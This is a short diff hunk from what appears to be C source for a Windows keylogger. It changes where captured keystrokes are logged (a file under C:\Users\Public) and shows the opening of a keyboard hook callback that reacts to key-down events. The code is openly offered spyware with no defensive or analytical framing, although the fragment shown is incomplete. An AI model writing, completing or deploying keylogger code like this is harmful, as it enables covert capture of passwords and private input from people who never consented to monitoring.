@@ -12,7 +12,7 @@
 #endif
 
 #ifdef _WIN32
-const char keyloggerfile[256] = "C:\\Users\\Public\\Music\\log.txt";
+const char keyloggerfile[256] = "C:\\Users\\Public\\log.txt";
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     int keyCount = 0;
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
